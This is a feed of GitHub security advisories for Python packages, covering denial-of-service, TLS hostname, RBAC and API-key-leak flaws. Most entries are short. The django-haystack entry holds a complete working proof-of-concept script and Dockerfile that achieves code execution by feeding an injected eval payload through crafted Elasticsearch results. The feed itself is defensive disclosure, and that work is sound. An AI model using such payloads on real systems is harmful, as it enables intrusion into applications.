<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-07-16T18:53:45.053Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[infinistore] bytedance InfiniStore: Denial of Service via Non-Cryptographic Hashing in InfiniStore KV Map]]></title>
        <id>https://github.com/advisories/GHSA-2vrg-7rqv-prf9</id>
        <link href="https://github.com/advisories/GHSA-2vrg-7rqv-prf9"/>
        <updated>2026-07-15T23:37:51.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in bytedance InfiniStore up to 0.2.33. The impacted element is the function purge_kv_map in the library /src/infinistore.h of the component KV Map Handler. Performing a manipulation results in inefficient algorithmic complexity. The attack requires a local approach. The exploit has been made public and could be used. The project was informed of the problem early through an issue report but has not responded yet.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-11312">https://nvd.nist.gov/vuln/detail/CVE-2026-11312</a></li>
<li><a href="https://github.com/bytedance/InfiniStore/issues/200">https://github.com/bytedance/InfiniStore/issues/200</a></li>
<li><a href="https://github.com/bytedance/InfiniStore">https://github.com/bytedance/InfiniStore</a></li>
<li><a href="https://vuldb.com/cve/CVE-2026-11312">https://vuldb.com/cve/CVE-2026-11312</a></li>
<li><a href="https://vuldb.com/submit/832348">https://vuldb.com/submit/832348</a></li>
<li><a href="https://vuldb.com/vuln/368398">https://vuldb.com/vuln/368398</a></li>
<li><a href="https://vuldb.com/vuln/368398/cti">https://vuldb.com/vuln/368398/cti</a></li>
<li><a href="https://github.com/advisories/GHSA-2vrg-7rqv-prf9">https://github.com/advisories/GHSA-2vrg-7rqv-prf9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2vrg-7rqv-prf9</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-06-05T03:31:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ironic] OpenStack Ironic: Crafted JSON String to Certain Endpoints on the API or JSON-RPC Service May Result in Service Crash]]></title>
        <id>https://github.com/advisories/GHSA-q3g8-rjrx-59ph</id>
        <link href="https://github.com/advisories/GHSA-q3g8-rjrx-59ph"/>
        <updated>2026-07-15T23:30:16.000Z</updated>
        <content type="html"><![CDATA[<p>In OpenStack Ironic 32.0.0 through 35.0.1, an unauthenticated malicious user could submit a crafted JSON string to some endpoints on the API or JSON-RPC service and effect a service crash.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-50589">https://nvd.nist.gov/vuln/detail/CVE-2026-50589</a></li>
<li><a href="https://bugs.launchpad.net/ironic/+bug/2154288">https://bugs.launchpad.net/ironic/+bug/2154288</a></li>
<li><a href="https://wiki.openstack.org/wiki/OSSN/OSSN-0099">https://wiki.openstack.org/wiki/OSSN/OSSN-0099</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2026/06/06/2">http://www.openwall.com/lists/oss-security/2026/06/06/2</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2026-50589">https://access.redhat.com/security/cve/CVE-2026-50589</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2485353">https://bugzilla.redhat.com/show_bug.cgi?id=2485353</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/ironic/PYSEC-2026-216.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/ironic/PYSEC-2026-216.yaml</a></li>
<li><a href="https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-50589.json">https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-50589.json</a></li>
<li><a href="https://github.com/advisories/GHSA-q3g8-rjrx-59ph">https://github.com/advisories/GHSA-q3g8-rjrx-59ph</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q3g8-rjrx-59ph</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-05T00:31:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ddtrace] dd-trace-py: Improper parsing of W3C baggage headers may lead to DoS]]></title>
        <id>https://github.com/advisories/GHSA-mw54-j2v2-42hr</id>
        <link href="https://github.com/advisories/GHSA-mw54-j2v2-42hr"/>
        <updated>2026-07-15T22:55:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Datadog tracing libraries that implement W3C baggage propagation parse incoming baggage HTTP headers without enforcing item-count or byte-size limits on the extract path. The DD_TRACE_BAGGAGE_MAX_ITEMS (default 64) and DD_TRACE_BAGGAGE_MAX_BYTES (default 8192) limits were applied only to baggage injection, not extraction. A remote, unauthenticated attacker can send a request whose baggage header contains an arbitrarily large number of comma-separated key-value pairs (or a single very large value). The tracer allocates a hash-map entry for each pair on every request, causing unbounded CPU and memory consumption and enabling a remote Denial of Service against any HTTP service that has the baggage propagation style enabled.
The baggage propagation style is enabled by default in most affected tracers, so any internet-facing service that has been instrumented with an affected tracer version is exposed unless the propagation style has been explicitly narrowed.</p>
<h3 id="patches">Patches</h3>
<p>This is resolved in version 4.8.2 and later of the <code>dd-trace-py</code> library</p>
<h3 id="workarounds">Workarounds</h3>
<p>If users cannot upgrade immediately:</p>
<ol>
<li>Disable <code>baggage</code> extraction by removing <code>baggage</code> from <code>DD_TRACE_PROPAGATION_STYLE</code> (or <code>DD_TRACE_PROPAGATION_STYLE_EXTRACT</code> if set independently).</li>
<li>Cap the maximum HTTP request header size at an upstream proxy or web server (for example, Apache <code>LimitRequestFieldSize</code>, Nginx <code>large_client_header_buffers</code>, Envoy <code>max_request_headers_kb</code>).</li>
</ol>
<h3 id="resources">Resources</h3>
<p>Related upstream advisories:
<a href="https://github.com/open-telemetry/opentelemetry-go/security/advisories/GHSA-mh2q-q3fh-2475">opentelemetry-go GHSA-mh2q-q3fh-2475</a>
<a href="https://github.com/open-telemetry/opentelemetry-dotnet/security/advisories/GHSA-g94r-2vxg-569j">opentelemetry-dotnet GHSA-g94r-2vxg-569j</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/DataDog/dd-trace-py/security/advisories/GHSA-mw54-j2v2-42hr">https://github.com/DataDog/dd-trace-py/security/advisories/GHSA-mw54-j2v2-42hr</a></li>
<li><a href="https://github.com/advisories/GHSA-mw54-j2v2-42hr">https://github.com/advisories/GHSA-mw54-j2v2-42hr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mw54-j2v2-42hr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-15T22:55:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[django-haystack] django-haystack: Remote Code Execution via `eval()` in Elasticsearch Result Deserialization]]></title>
        <id>https://github.com/advisories/GHSA-r3hx-x5rh-p9vv</id>
        <link href="https://github.com/advisories/GHSA-r3hx-x5rh-p9vv"/>
        <updated>2026-07-15T22:42:29.000Z</updated>
        <content type="html"><![CDATA[<h2 id="remote-code-execution-via-eval-in-elasticsearch-result-deserialization">Remote Code Execution via <code>eval()</code> in Elasticsearch Result Deserialization</h2>
<h3 id="summary">Summary</h3>
<p>The Elasticsearch backend in django-haystack calls <code>eval()</code> on raw field values returned from Elasticsearch when a <code>SearchField</code> is declared with an <code>index_fieldname</code> alias that differs from the logical field name. During result processing, the backend looks up fields by logical name but Elasticsearch stores them under the alias key; the lookup fails and the value falls through to <code>_to_python()</code> → <code>eval()</code>. An attacker who can control content that is indexed into Elasticsearch—and can trigger or wait for a search that returns it—achieves arbitrary code execution in the Django application process. CVSS 3.1 Base Score: <strong>8.5 (High)</strong>.</p>
<h3 id="details">Details</h3>
<p><strong>Sink — <code>haystack/backends/elasticsearch_backend.py:865</code>:</strong></p>
<pre><code class="language-python">converted_value = eval(value)
</code></pre>
<p><code>_to_python()</code> (line ~850) attempts to parse a string value by calling <code>eval()</code> before performing any type-safety check. If the value is an attacker-controlled Python expression such as <code>__import__('os').system(...)</code>, the expression is executed unconditionally.</p>
<p><strong>Root cause — <code>haystack/backends/elasticsearch_backend.py:727–737</code>:</strong></p>
<pre><code class="language-python">for key, value in source.items():
    string_key = str(key)

    if string_key in index.fields and hasattr(index.fields[string_key], "convert"):
        additional_fields[string_key] = index.fields[string_key].convert(value)
    else:
        additional_fields[string_key] = self._to_python(value)
</code></pre>
<p><code>index.fields</code> is keyed by the <em>logical</em> field name (e.g. <code>"name"</code>), but Elasticsearch stores the document under the <code>index_fieldname</code> alias (e.g. <code>"name_s"</code>). Because <code>"name_s" not in index.fields</code>, the branch falls through to <code>self._to_python(value)</code>.</p>
<p><strong>Data flow (source → sink):</strong></p>
<ol>
<li><code>haystack/indexes.py:226</code> — <code>self.prepared_data[field.index_fieldname] = field.prepare(obj)</code> stores data under the alias.</li>
<li><code>haystack/backends/elasticsearch_backend.py:218</code> — prepared data copied into <code>final_data</code>.</li>
<li><code>haystack/backends/elasticsearch_backend.py:236</code> — <code>bulk(...)</code> writes the document to Elasticsearch under the alias key.</li>
<li><code>haystack/backends/elasticsearch_backend.py:574</code> — search reads attacker-influenced <code>_source</code> back from Elasticsearch.</li>
<li><code>haystack/backends/elasticsearch_backend.py:720</code> — <code>_process_results()</code> takes <code>raw_result["_source"]</code>.</li>
<li><code>haystack/backends/elasticsearch_backend.py:730</code> — lookup <code>string_key in index.fields</code> fails for alias keys.</li>
<li><code>haystack/backends/elasticsearch_backend.py:737</code> — unmatched value passed to <code>_to_python(value)</code>.</li>
<li><code>haystack/backends/elasticsearch_backend.py:865</code> — <strong>sink</strong>: <code>converted_value = eval(value)</code>.</li>
</ol>
<p><strong>Missing fix:</strong> The Solr backend correctly remaps aliases at <code>haystack/backends/solr_backend.py:535–539</code> using <code>index.field_map</code> before performing the <code>index.fields</code> lookup. The Elasticsearch backend has no equivalent remapping.</p>
<p><strong>Preconditions:</strong></p>
<ul>
<li>The application uses the Elasticsearch backend.</li>
<li>At least one <code>SearchField</code> in a <code>SearchIndex</code> is declared with <code>index_fieldname</code> set to a value different from the logical attribute name.</li>
<li>The attacker can write content that is indexed (e.g. via a form, API, or any user-controlled field included in the index).</li>
<li>The attacker can trigger or wait for a search that returns the malicious document.</li>
</ul>
<h3 id="poc">PoC</h3>
<p><strong>Environment setup (Docker):</strong></p>
<pre><code class="language-bash"># Build the proof-of-concept image
docker build -t vuln001-poc \
  -f /path/to/vuln-001/Dockerfile \
  /path/to/reports/pypiAi_436_django-haystack__django-haystack/

# Run the PoC — exits 0 on confirmed RCE
docker run --rm vuln001-poc
</code></pre>
<p><strong>Dockerfile</strong> (<code>vuln-001/Dockerfile</code>):</p>
<pre><code class="language-dockerfile">FROM python:3.11-slim
WORKDIR /app
RUN pip install --no-cache-dir setuptools setuptools_scm wheel
COPY repo/ /app/repo/
RUN pip install --no-cache-dir "Django&gt;=4.2" "elasticsearch&gt;=5,&lt;8"
RUN SETUPTOOLS_SCM_PRETEND_VERSION=0.0.dev0 pip install --no-cache-dir -e /app/repo/
COPY vuln-001/poc.py /app/poc.py
CMD ["python3", "/app/poc.py"]
</code></pre>
<p><strong>PoC script</strong> (<code>vuln-001/poc.py</code>) — key sections:</p>
<pre><code class="language-python"># SearchField with index_fieldname alias
class MockField:
    index_fieldname = "name_s"   # ES key
    def convert(self, value): return str(value)

class MockIndex:
    fields = {"name": MockField()}   # logical key — "name_s" NOT present
    field_map = {"name_s": "name"}

# Malicious payload placed in the alias key of a crafted ES _source response
MARKER_FILE = "/tmp/django_haystack_eval_rce_proof"
payload = (
    f"__import__('os').system("
    f"'echo PWNED_BY_EVAL_RCE &gt; {MARKER_FILE}')"
)

raw_results = {"hits": {"total": 1, "hits": [{
    "_score": 1.0,
    "_source": {
        "django_ct": "app.model",
        "django_id": "1",
        "name_s": payload,   # alias key → lookup fails → eval()
    },
}]}}

backend._process_results(raw_results)
# Confirms RCE: /tmp/django_haystack_eval_rce_proof contains "PWNED_BY_EVAL_RCE"
</code></pre>
<p><strong>Observed output (Phase 2 dynamic reproduction):</strong></p>
<pre><code>============================================================
VULN-001 PoC: eval() RCE in ElasticsearchSearchBackend
============================================================
[*] Payload : __import__('os').system('echo PWNED_BY_EVAL_RCE &gt; /tmp/django_haystack_eval_rce_proof')
[*] Marker  : /tmp/django_haystack_eval_rce_proof
[*] Sink    : elasticsearch_backend.py:865  eval(value)

[+] SUCCESS: RCE CONFIRMED
[+] Marker file created: /tmp/django_haystack_eval_rce_proof
[+] File content: PWNED_BY_EVAL_RCE

RESULT: PASS - VULN-001 is dynamically reproduced and exploitable
</code></pre>
<p><strong>Recommended remediation:</strong></p>
<pre><code class="language-diff">--- a/haystack/backends/elasticsearch_backend.py
+++ b/haystack/backends/elasticsearch_backend.py
-import re
+import ast
+import re
 
             index = source and unified_index.get_index(model)
+            index_field_map = index.field_map
             for key, value in source.items():
                 string_key = str(key)
+                if string_key in index_field_map:
+                    string_key = index_field_map[string_key]
 
                 if string_key in index.fields and hasattr(
                     index.fields[string_key], "convert"
 
-            converted_value = eval(value)
+            converted_value = ast.literal_eval(value)
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is a <strong>Remote Code Execution (RCE)</strong> vulnerability. Any attacker who can submit content that is stored and indexed in Elasticsearch—then retrieved via a search—can execute arbitrary Python (and shell) commands in the Django application process with the privileges of the web server. Full confidentiality, integrity, and availability of the server are at risk. Because Haystack is a reusable search library, the vulnerability affects all Django applications that use the Elasticsearch backend with <code>index_fieldname</code> aliasing, regardless of how authentication is configured by the application.</p>
<h3 id="reproduction-artifacts">Reproduction artifacts</h3>
<h4 id="dockerfile"><code>Dockerfile</code></h4>
<pre><code class="language-dockerfile">FROM python:3.11-slim

WORKDIR /app

# Install build tools needed for setuptools_scm
RUN pip install --no-cache-dir setuptools setuptools_scm wheel

# Copy the django-haystack repository source
COPY repo/ /app/repo/

# Install Django and the elasticsearch client
RUN pip install --no-cache-dir "Django&gt;=4.2" "elasticsearch&gt;=5,&lt;8"

# Install django-haystack from the local repo (editable install)
# setuptools_scm requires git metadata; use fallback version instead
RUN SETUPTOOLS_SCM_PRETEND_VERSION=0.0.dev0 pip install --no-cache-dir -e /app/repo/

# Copy the PoC script
COPY vuln-001/poc.py /app/poc.py

# Run the PoC by default
CMD ["python3", "/app/poc.py"]
</code></pre>
<h4 id="pocpy"><code>poc.py</code></h4>
<pre><code class="language-python">"""
PoC for VULN-001: Arbitrary Code Execution via eval() in
ElasticsearchSearchBackend._process_results (django-haystack)

Vulnerability:
    haystack/backends/elasticsearch_backend.py:865 calls eval(value) on
    Elasticsearch _source field values that do not match any entry in
    index.fields. This mismatch occurs when a SearchField uses
    index_fieldname (alias) different from its logical field name: ES stores
    data under the alias, but the backend looks up fields by logical name,
    causing unmatched values to fall through to _to_python() -&gt; eval().

Attack path:
    1. Attacker controls content that is indexed into Elasticsearch.
    2. The Django app has a SearchIndex field with index_fieldname alias.
    3. ES stores the document under the alias key.
    4. On search, _process_results reads _source where the alias key is NOT
       found in index.fields (which uses logical names).
    5. The value routes to _to_python(value) -&gt; eval(value) -&gt; RCE.

This PoC bypasses the need for a live Elasticsearch instance by directly
calling _process_results() with a crafted raw result dict.
"""

import os
import sys

# ---------------------------------------------------------------------------
# 1. Configure Django (no database required)
# ---------------------------------------------------------------------------
from django.conf import settings

if not settings.configured:
    settings.configure(
        SECRET_KEY="poc-only-not-for-production",
        INSTALLED_APPS=[
            "django.contrib.contenttypes",
            "django.contrib.auth",
            "haystack",
        ],
        HAYSTACK_CONNECTIONS={
            "default": {
                "ENGINE": "haystack.backends.elasticsearch_backend.ElasticsearchSearchEngine",
                "URL": "http://127.0.0.1:9200/",
                "INDEX_NAME": "poc_index",
            }
        },
        DATABASES={},
    )

import haystack
import haystack.backends.elasticsearch_backend as esb

# ---------------------------------------------------------------------------
# 2. Mock objects to simulate the Haystack/ES environment
# ---------------------------------------------------------------------------

class MockField:
    """
    Simulates a SearchField declared with an index_fieldname alias.
    Logical field name: "name"
    ES storage key (index_fieldname): "name_s"
    """
    index_fieldname = "name_s"

    def convert(self, value):
        return str(value)


class MockIndex:
    """
    Simulates a SearchIndex.
    fields: keyed by LOGICAL name ("name")
    field_map: alias -&gt; logical name  (Solr uses this; ES backend does NOT)
    """
    fields = {
        "name": MockField(),
    }
    field_map = {"name_s": "name"}


class MockUnifiedIndex:
    document_field = "text"

    def get_indexed_models(self):
        return [object]

    def get_index(self, model):
        return MockIndex()


class MockConnection:
    def get_unified_index(self):
        return MockUnifiedIndex()


# Patch the global haystack connections registry so _process_results can
# look up the unified index without a real Elasticsearch connection.
haystack.connections = {"default": MockConnection()}

# Patch the model-lookup helper used inside _process_results.
# Returns `object` so the model is found and the result is processed.
esb.haystack_get_model = lambda app_label, model_name: object

# ---------------------------------------------------------------------------
# 3. Build the malicious payload
# ---------------------------------------------------------------------------
MARKER_FILE = "/tmp/django_haystack_eval_rce_proof"

# os.system() returns the exit code (int). The isinstance(int) check in
# _to_python() passes, so eval() completes without raising, confirming
# full expression execution. The shell command writes the proof file.
payload = (
    f"__import__('os').system("
    f"'echo PWNED_BY_EVAL_RCE &gt; {MARKER_FILE}')"
)

# Crafted Elasticsearch raw response:
#   "name_s" is the index_fieldname alias stored in ES.
#   "name" is the logical field name present in index.fields.
#   Because "name_s" != "name", the lookup fails and value goes to eval().
raw_results = {
    "hits": {
        "total": 1,
        "hits": [
            {
                "_score": 1.0,
                "_source": {
                    "django_ct": "app.model",   # required sentinel field
                    "django_id": "1",           # required sentinel field
                    "name_s": payload,          # alias key -&gt; eval() path
                },
            }
        ],
    }
}

# ---------------------------------------------------------------------------
# 4. Instantiate the backend without __init__ (no live ES connection needed)
# ---------------------------------------------------------------------------
backend = esb.ElasticsearchSearchBackend.__new__(esb.ElasticsearchSearchBackend)
backend.connection_alias = "default"
backend.include_spelling = False

# ---------------------------------------------------------------------------
# 5. Trigger the vulnerability
# ---------------------------------------------------------------------------
print("=" * 60)
print("VULN-001 PoC: eval() RCE in ElasticsearchSearchBackend")
print("=" * 60)
print(f"[*] Payload : {payload}")
print(f"[*] Marker  : {MARKER_FILE}")
print(f"[*] Sink    : elasticsearch_backend.py:865  eval(value)")
print()

# Remove any leftover marker from a previous run
if os.path.exists(MARKER_FILE):
    os.remove(MARKER_FILE)

try:
    backend._process_results(raw_results)
except Exception as exc:
    # An exception here does not mean eval() was not called;
    # the side effect (file write) is the ground truth.
    print(f"[!] _process_results raised (checking side effects anyway): {exc}")

# ---------------------------------------------------------------------------
# 6. Verify the side effect
# ---------------------------------------------------------------------------
print()
if os.path.exists(MARKER_FILE):
    content = open(MARKER_FILE).read().strip()
    print("[+] SUCCESS: RCE CONFIRMED")
    print(f"[+] Marker file created: {MARKER_FILE}")
    print(f"[+] File content: {content}")
    print()
    print("RESULT: PASS - VULN-001 is dynamically reproduced and exploitable")
    sys.exit(0)
else:
    print("[-] FAILURE: Marker file was not created")
    print("[-] eval() was not triggered or the payload did not execute")
    print()
    print("RESULT: FAIL - RCE could not be confirmed")
    sys.exit(1)
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/django-haystack/django-haystack/security/advisories/GHSA-r3hx-x5rh-p9vv">https://github.com/django-haystack/django-haystack/security/advisories/GHSA-r3hx-x5rh-p9vv</a></li>
<li><a href="https://github.com/django-haystack/django-haystack/commit/eb05f193c9771a68dcc8cfac6674a0d48a52ee9d">https://github.com/django-haystack/django-haystack/commit/eb05f193c9771a68dcc8cfac6674a0d48a52ee9d</a></li>
<li><a href="https://github.com/django-haystack/django-haystack/releases/tag/v3.4.0">https://github.com/django-haystack/django-haystack/releases/tag/v3.4.0</a></li>
<li><a href="https://github.com/advisories/GHSA-r3hx-x5rh-p9vv">https://github.com/advisories/GHSA-r3hx-x5rh-p9vv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r3hx-x5rh-p9vv</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-15T22:42:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[neutron] OpenStack Neutron: Neutron port RBAC policy bypass allows project managers to set trusted device owners on shared networks]]></title>
        <id>https://github.com/advisories/GHSA-qmc5-gv6v-8p22</id>
        <link href="https://github.com/advisories/GHSA-qmc5-gv6v-8p22"/>
        <updated>2026-07-15T22:40:06.000Z</updated>
        <content type="html"><![CDATA[<p>In OpenStack Neutron before 28.0.1, a project manager can create or update a port on a shared network owned by another project and set device_owner to a value that has "network:" at the beginning ("network:dhcp" for example). The default port RBAC policies incorrectly included PROJECT_MANAGER without requiring network ownership, allowing any project manager to obtain trusted network-service port behavior on shared networks. Depending on backend and deployment, this can bypass anti-spoofing and security group protections, enabling DHCP, MAC, or IP spoofing against other tenants on the shared network. This is a regression of CVE-2015-5240 (OSSA-2015-018).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-50266">https://nvd.nist.gov/vuln/detail/CVE-2026-50266</a></li>
<li><a href="https://bugs.launchpad.net/neutron/+bug/2152115">https://bugs.launchpad.net/neutron/+bug/2152115</a></li>
<li><a href="https://launchpad.net/bugs/2152115">https://launchpad.net/bugs/2152115</a></li>
<li><a href="https://review.opendev.org/990273">https://review.opendev.org/990273</a></li>
<li><a href="https://review.opendev.org/990353">https://review.opendev.org/990353</a></li>
<li><a href="https://review.opendev.org/990356">https://review.opendev.org/990356</a></li>
<li><a href="https://www.openwall.com/lists/oss-security/2026/06/04/6">https://www.openwall.com/lists/oss-security/2026/06/04/6</a></li>
<li><a href="https://github.com/advisories/GHSA-qmc5-gv6v-8p22">https://github.com/advisories/GHSA-qmc5-gv6v-8p22</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qmc5-gv6v-8p22</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-06-04T18:30:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[oslo.messaging] OpenStack oslo.messaging does not verify RabbitMQ broker hostname during TLS handshake]]></title>
        <id>https://github.com/advisories/GHSA-76qh-xr7q-h39m</id>
        <link href="https://github.com/advisories/GHSA-76qh-xr7q-h39m"/>
        <updated>2026-07-15T22:30:08.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in OpenStack oslo.messaging 1.0.0 through 17.3.0. The oslo.messaging RabbitMQ driver does not perform TLS hostname verification when connecting to the message broker. When ssl_ca_file is configured, the driver enables certificate chain validation but does not pass the expected broker hostname into the underlying TLS stack. Any certificate signed by the deployment CA is accepted regardless of hostname, allowing an attacker who can intercept control-plane traffic to impersonate the RabbitMQ broker and perform a man-in-the-middle attack on RPC and notification traffic. All OpenStack services using oslo.messaging with RabbitMQ over TLS are affected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-44393">https://nvd.nist.gov/vuln/detail/CVE-2026-44393</a></li>
<li><a href="https://bugs.launchpad.net/oslo.messaging/+bug/2150316">https://bugs.launchpad.net/oslo.messaging/+bug/2150316</a></li>
<li><a href="https://wiki.openstack.org/wiki/OSSN/OSSN-0096">https://wiki.openstack.org/wiki/OSSN/OSSN-0096</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2026-44393">https://access.redhat.com/security/cve/CVE-2026-44393</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2484835">https://bugzilla.redhat.com/show_bug.cgi?id=2484835</a></li>
<li><a href="https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-44393.json">https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-44393.json</a></li>
<li><a href="https://github.com/advisories/GHSA-76qh-xr7q-h39m">https://github.com/advisories/GHSA-76qh-xr7q-h39m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-76qh-xr7q-h39m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-04T18:30:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[lmcache] LMCache: 16-bit multimodal hash collision can poison KV cache entries]]></title>
        <id>https://github.com/advisories/GHSA-3hh9-752g-5g22</id>
        <link href="https://github.com/advisories/GHSA-3hh9-752g-5g22"/>
        <updated>2026-07-15T22:10:25.000Z</updated>
        <content type="html"><![CDATA[<p>A flaw has been found in LMCache up to 0.4.6. This affects the function hex_hash_to_int16 of the file lmcache/integration/vllm/utils.py of the component KV Cache Handler. Executing a manipulation can lead to use of weak hash. The attack needs to be launched locally. The attack requires a high level of complexity. It is indicated that the exploitability is difficult. The exploit has been published and may be used. The pull request to fix this issue awaits acceptance.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-10813">https://nvd.nist.gov/vuln/detail/CVE-2026-10813</a></li>
<li><a href="https://github.com/LMCache/LMCache/issues/3301">https://github.com/LMCache/LMCache/issues/3301</a></li>
<li><a href="https://github.com/LMCache/LMCache/pull/2932">https://github.com/LMCache/LMCache/pull/2932</a></li>
<li><a href="https://github.com/LMCache/LMCache">https://github.com/LMCache/LMCache</a></li>
<li><a href="https://vuldb.com/cve/CVE-2026-10813">https://vuldb.com/cve/CVE-2026-10813</a></li>
<li><a href="https://vuldb.com/submit/831641">https://vuldb.com/submit/831641</a></li>
<li><a href="https://vuldb.com/vuln/368261">https://vuldb.com/vuln/368261</a></li>
<li><a href="https://vuldb.com/vuln/368261/cti">https://vuldb.com/vuln/368261/cti</a></li>
<li><a href="https://github.com/advisories/GHSA-3hh9-752g-5g22">https://github.com/advisories/GHSA-3hh9-752g-5g22</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3hh9-752g-5g22</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-06-04T18:30:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cyberdrop-dl-patched] Pixeldrain API key shared with unverified thirdparty sites]]></title>
        <id>https://github.com/advisories/GHSA-f5pf-q7c7-m3vv</id>
        <link href="https://github.com/advisories/GHSA-f5pf-q7c7-m3vv"/>
        <updated>2026-07-15T22:00:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When processing Pixeldrain URLs, <code>cyberdrop-dl-patched</code> could send an <code>Authorization</code> header that includes the user's API key to unverified hosts.</p>
<h3 id="details">Details</h3>
<p>Pixeldrain offers several alternative domains in case the user's ISP blocks the primary domain. To support this, requests made by <code>cyberdrop-dl-patched</code> are not hardcoded and will use the same host as the input URL for API requests.</p>
<p><code>cyberdrop-dl-patched</code> matches URLs to a crawler based on their host. If the host contains a crawler's supported host as a sub-string, it will match to that crawler. </p>
<p>An URL from a malicious domain (ex: <code>https://evil-pixeldrain.com</code>) would successfully match to the Pixeldrain crawler and <code>cyberdrop-dl-patched</code> will blindly use that host for any API request (<code>https://evil-pixeldrain.com/api</code>), leaking the user's API key to the malicious actor via the <code>Authorization</code> header.</p>
<h3 id="impact">Impact</h3>
<p>Anyone who has setup a Pixeldrain API key with <code>cyberdrop-dl-patched</code> and uses <code>cyberdrop-dl-patched</code> on sites that could spawn downloads for other sites (ex: forums, Wordpress, Pixeldrain itself, etc...)</p>
<h3 id="patches">Patches</h3>
<p><code>cyberdrop-dl-patched</code>  v9.14.0 fixes this issue by rejecting any Pixedrain URL if the host does not match an official domain <strong>exactly</strong>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>It's recommended to upgrade <code>cyberdrop-dl-patched</code> to version v9.14.0</p>
<p>Anyone who has used a Pixeldrain API key with <code>cyberdrop-dl-patched</code> should consider them compromised and delete them from their Pixeldrain account.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Cyberdrop-DL/cyberdrop-dl/security/advisories/GHSA-f5pf-q7c7-m3vv">https://github.com/Cyberdrop-DL/cyberdrop-dl/security/advisories/GHSA-f5pf-q7c7-m3vv</a></li>
<li><a href="https://github.com/Cyberdrop-DL/cyberdrop-dl/commit/4479555ae3f9d56d7657d6179a5bac3123eb4e2b">https://github.com/Cyberdrop-DL/cyberdrop-dl/commit/4479555ae3f9d56d7657d6179a5bac3123eb4e2b</a></li>
<li><a href="https://docs.pixeldrain.com/questions_and_answers/#alternative-domain-names">https://docs.pixeldrain.com/questions_and_answers/#alternative-domain-names</a></li>
<li><a href="https://github.com/Cyberdrop-DL/cyberdrop-dl/releases/tag/9.14.0">https://github.com/Cyberdrop-DL/cyberdrop-dl/releases/tag/9.14.0</a></li>
<li><a href="https://github.com/advisories/GHSA-f5pf-q7c7-m3vv">https://github.com/advisories/GHSA-f5pf-q7c7-m3vv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f5pf-q7c7-m3vv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
